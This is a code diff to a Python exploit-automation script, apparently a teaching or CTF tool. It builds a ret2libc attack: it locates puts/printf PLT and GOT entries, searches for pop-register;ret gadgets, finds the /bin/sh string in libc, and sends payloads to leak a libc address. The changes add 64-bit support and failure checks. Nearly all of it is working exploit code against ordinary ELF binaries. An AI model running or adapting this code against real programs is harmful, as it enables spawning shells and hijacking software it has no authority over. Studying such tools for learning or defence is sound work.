@@ -1,3 +1,4 @@
+#! /usr/bin/python3
 import os
 from os import path
 import click
@@ -12,6 +13,8 @@ from generate_random_payload import Fifo_handler
 
 
 def hex_to_int(hex_str=''):
+    if len(hex_str) == 0:
+        return 0
     return int(hex_str, 16)
 
 
@@ -155,12 +158,14 @@ print("---------------------------------------------")
 # For GOT address, we are interested in .got.plt section
 # of "readelf -S binary_file"
 found_printf, printf_plt, printf_got = bh.search_plt_got(program_name,
-                                                         'printf')
+                                                         'printf',
+                                                         bin_arch)
 # TODO: temporarily not using printf
 found_printf = False
 
 found_puts, puts_plt, puts_got = bh.search_plt_got(program_name,
-                                                   'puts')
+                                                   'puts',
+                                                   bin_arch)
 
 if found_printf:
     print("Found address of printf@plt", printf_plt)
@@ -179,7 +184,7 @@ sstart_found, sstart_address = bh.search_asm_function(program_name, '_start')
 
 print("Found address of _start", sstart_address)
 
-if has_null_bytes(sstart_address):
+if bin_arch == 32 and has_null_bytes(sstart_address):
     print("WARNING, address contains NULL bytes, adjusting...")
     sstart_address_int = hex_to_int(sstart_address)
     sstart_address_int = sstart_address_int + 4
@@ -200,12 +205,12 @@ print("offset of exit", exit_offset)
 click_confirm('Press any key to continue searching for gadget')
 
 print("")
-print("Searching for gadget address (pop e?x; ret;)")
+print("Searching for gadget address (pop [register]; ret;)")
 print("---------------------------------------------")
 
 # find any gadget pop register; ret;
 ax_sections = bh.get_ax_sections(program_name)
-gfinder = Gadget_finder(program_name)
+gfinder = Gadget_finder(program_name, bin_arch)
 found_gadget = False
 gadget_address = ''
 popregret_address = ''
@@ -215,8 +220,13 @@ for xsection in ax_sections:
     ax_add_int = hex_to_int(ax_sections[xsection][0])
     ax_start_int = hex_to_int(ax_sections[xsection][1])
     ax_end_int = ax_start_int + hex_to_int(ax_sections[xsection][2])
-
-    gadget_regex = r"0x([a-f0-9]+):\spop\se\w?x;\s?(0x[a-f0-9]+):\s?ret\s?;"
+    gadget_regex = None
+    if bin_arch == 32:
+        gadget_regex = r"0x([a-f0-9]+):\spop\se\w?x;\s?" + \
+                       r"(0x[a-f0-9]+):\s?ret\s?;"
+    else:
+        gadget_regex = r"0x([a-f0-9]+):\spop\sr(\w?x|di|\d+);\s?" + \
+                       r"(0x[a-f0-9]+):\s?retq?\s?;"
     found_gadget, gadget_address = gfinder.find(gadget_regex,
                                                 ax_start_int,
                                                 ax_end_int)
@@ -228,6 +238,11 @@ for xsection in ax_sections:
               hex(popregret_address))
         break
 
+if found_gadget is False:
+    print("Unable to find gadget, exiting...")
+    cleanup(payload_name)
+    exit()
+
 click_confirm('Press any key to continue find /bin/sh address offset')
 
 print("")
@@ -235,7 +250,7 @@ print("Searching for /bin/sh address offset")
 print("---------------------------------------------")
 
 # find bin/sh string address from libc's rodata
-b_sec_results = bh.search_binary_section(bh.libc_path, '.rodata')
+b_sec_results = bh.search_section(bh.libc_path, '.rodata')
 found_rodata, rodata_address, rodata_start, rodata_end = b_sec_results
 rodata_address_int = hex_to_int(rodata_address)
 rodata_start_int = hex_to_int(rodata_start)
@@ -312,7 +327,7 @@ recv_str = proc.recvuntil(delims=tempstr.encode('utf-8'), timeout=10)
 print("Receive from program with first payload: {}".format(recv_str))
 
 if len(recv_str) == 0:
-    print("exploit failed")
+    print("Exploit failed")
     cleanup(payload_name)
     exit()
 
@@ -340,6 +355,11 @@ if found_printf:
 else:
     print("Leaked address of puts:",
           hex(int.from_bytes(leaked_bytes, byteorder='little')))
+
+if len(leaked_bytes) == 0:
+    print("Exploit failed, no address leaked")
+    cleanup(payload_name)
+    exit()
 
 click_confirm('Press any key to calculate libc address')
 
